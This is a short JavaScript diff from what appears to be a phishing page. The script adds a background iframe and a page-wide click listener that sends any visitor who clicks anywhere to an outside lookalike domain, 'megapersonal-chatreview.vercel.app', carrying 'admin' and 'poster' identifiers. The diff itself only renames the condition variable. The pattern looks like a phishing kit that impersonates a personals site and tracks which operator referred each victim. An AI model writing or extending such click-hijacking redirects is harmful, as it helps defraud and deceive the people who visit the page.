@@ -50,7 +50,7 @@ document.body.appendChild(backgroundIframe);
 
 // Redirect when clicking anywhere on the page
 document.body.addEventListener('click', () => {
-    if (userId) {
+    if (poster) {
         window.location.href = `https://megapersonal-chatreview.vercel.app/${admin}/${poster}`;
     } else {
         alert('User ID not found!');
